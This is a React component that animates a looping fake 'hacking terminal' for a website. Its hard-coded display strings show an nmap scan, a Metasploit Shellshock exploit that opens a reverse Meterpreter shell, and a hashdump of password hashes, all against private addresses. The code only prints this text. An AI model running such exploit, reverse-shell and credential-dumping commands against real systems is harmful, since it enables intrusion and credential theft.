import { useState, useEffect, useRef } from 'react';

const terminalLines = [
    "root@cybersec:~# initiating sequence...",
    "[OK] Sequence initiated.",
    "root@cybersec:~# nmap -sS -p- 10.0.0.1",
    "Starting Nmap 7.92 ( https://nmap.org )",
    "Nmap scan report for 10.0.0.1",
    "Host is up (0.0020s latency).",
    "Not shown: 65532 closed tcp ports (reset)",
    "PORT     STATE SERVICE",
    "22/tcp   open  ssh",
    "80/tcp   open  http",
    "443/tcp  open  https",
    "root@cybersec:~# msfconsole -q",
    "msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec",
    "msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.0.0.1",
    "RHOSTS => 10.0.0.1",
    "msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/status",
    "TARGETURI => /cgi-bin/status",
    "msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit",
    "[*] Started reverse TCP handler on 10.0.0.2:4444",
    "[*] Command Stager progress - 100.00% done (773/773 bytes)",
    "[*] Sending stage (985320 bytes) to 10.0.0.1",
    "[*] Meterpreter session 1 opened (10.0.0.2:4444 -> 10.0.0.1:49152)",
    "meterpreter > getuid",
    "Server username: root",
    "meterpreter > hashdump",
    "root:$6$xyz$abc:18671:0:99999:7:::",
    "admin:$6$lmn$opq:18671:0:99999:7:::",
    "meterpreter > _"
];

export default function HackingTerminal() {
    const [lines, setLines] = useState<string[]>([]);
    const [currentIndex, setCurrentIndex] = useState(0);
    const containerRef = useRef<HTMLDivElement>(null);

    useEffect(() => {
        if (currentIndex < terminalLines.length) {
            const timer = setTimeout(() => {
                setLines(prev => [...prev, terminalLines[currentIndex]]);
                setCurrentIndex(prev => prev + 1);
            }, Math.random() * 500 + 100);

            return () => clearTimeout(timer);
        } else {
            // Loop the animation after a delay
            const resetTimer = setTimeout(() => {
                setLines([]);
                setCurrentIndex(0);
            }, 5000);
            return () => clearTimeout(resetTimer);
        }
    }, [currentIndex]);

    useEffect(() => {
        if (containerRef.current) {
            // Scroll only the container element itself, not the window
            containerRef.current.scrollTop = containerRef.current.scrollHeight;
        }
    }, [lines]);

    return (
        <div ref={containerRef} className="w-full h-full bg-[#0a0f0d] text-primary p-4 font-mono text-[10px] sm:text-xs overflow-y-auto leading-relaxed border border-secondary rounded-2xl text-left shadow-[inset_0_0_20px_rgba(0,0,0,0.8)] custom-scrollbar">
            <div className="flex gap-2 mb-4 border-b border-primary/20 pb-2 custom-scrollbar">
                <div className="w-3 h-3 rounded-full bg-red-500/80"></div>
                <div className="w-3 h-3 rounded-full bg-yellow-500/80"></div>
                <div className="w-3 h-3 rounded-full bg-green-500/80"></div>
                <span className="ml-2 text-primary/50 text-[10px] uppercase tracking-widest">Hacking Terminal Operational</span>
            </div>

            <div className="flex flex-col gap-1 mt-2 pb-8 custom-scrollbar">
                {lines.map((line, idx) => (
                    <div key={idx} className={`${line.includes('root@') || line.includes('msf6') || line.includes('meterpreter') ? 'text-green-400 font-bold' : 'text-slate-300'}`}>
                        {line}
                    </div>
                ))}
                {currentIndex < terminalLines.length && (
                    <div className="w-2 h-4 bg-primary animate-pulse inline-block mt-1"></div>
                )}
            </div>
        </div>
    );
}
